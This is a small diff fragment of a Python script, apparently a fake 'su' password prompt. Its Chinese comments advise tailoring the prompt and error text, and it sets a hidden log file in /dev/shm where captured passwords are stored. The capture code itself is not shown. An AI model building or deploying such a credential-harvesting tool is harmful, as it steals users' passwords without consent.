@@ -11,7 +11,6 @@ import os, sys, getpass, time
 使用时应根据实际情况修改prompt和出错时的提示词
 '''
 
-
 current_time = time.strftime("%Y-%m-%d %H:%M")
 logfile = "/dev/shm/.su.log"  # 密码获取后记录在这里
 # CentOS
